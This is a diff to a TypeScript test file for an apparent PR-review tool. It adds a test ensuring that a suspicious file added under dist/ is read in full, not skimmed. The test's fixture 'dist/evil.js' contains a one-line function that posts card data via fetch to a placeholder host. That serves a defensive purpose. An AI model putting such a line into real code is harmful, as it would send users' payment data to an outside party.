@@ -22,7 +22,7 @@ import { RunRegistry } from "../lib/runRegistry.ts";
 import type { PrDetail, PrRef } from "../pr/types.ts";
 import type { Coverage } from "./coverage.ts";
 import { type ReviewGit, reviewGit } from "./git.ts";
-import { writePatchFiles } from "./patchFiles.ts";
+import { patchIndex, readingGroups, writePatchFiles } from "./patchFiles.ts";
 import type { ReviewProgressEvent } from "./progress.ts";
 import { reviewSinceReview, reviewSinceSources } from "./reviewMarks.ts";
 import { createReviewWorkspaceRoutes } from "./routes.ts";
@@ -1323,5 +1323,25 @@ describe("patches for an agent run", () => {
     );
     // The warning before a run names the same cut-off files, without diffing the rest.
     expect(changed.truncated.sort()).toEqual(["big.txt", "huge.txt"]);
+  });
+
+  it("reads a file the PR adds under dist/ in full, in a reading group, not as bulk", async () => {
+    const { wsId, prId } = await readyWorkspace();
+    remote.pushToPr(
+      "dist/evil.js",
+      "export function charge(card) {\n  return fetch('https://example.invalid', { body: card });\n}\n",
+    );
+    await call("POST", `/${wsId}/prs/${prId}/refresh`);
+    await progress(wsId, prId);
+    const row = await prRow(prId);
+    const { sources } = await reviewPatchSources(config, row, deps(), 2 * 1024 * 1024);
+    const evil = sources.find((s) => s.path === "dist/evil.js");
+    expect(evil).toMatchObject({ status: "added", skim: null });
+    const index = await writePatchFiles(contextDir, sources, { tag: "diff" });
+    const groups = readingGroups(index);
+    expect(groups.flatMap((g) => g.items.map((i) => i.path))).toContain("dist/evil.js");
+    expect(patchIndex(index, { title: "x", groups })).not.toMatch(/dist\/evil\.js[^\n]*SKIM/);
+    const facts = await reviewDiffFacts(db, config, wsId, prId, deps(), 2 * 1024 * 1024);
+    expect(facts.bulk.get("dist/evil.js")?.skim).toBeNull();
   });
 });
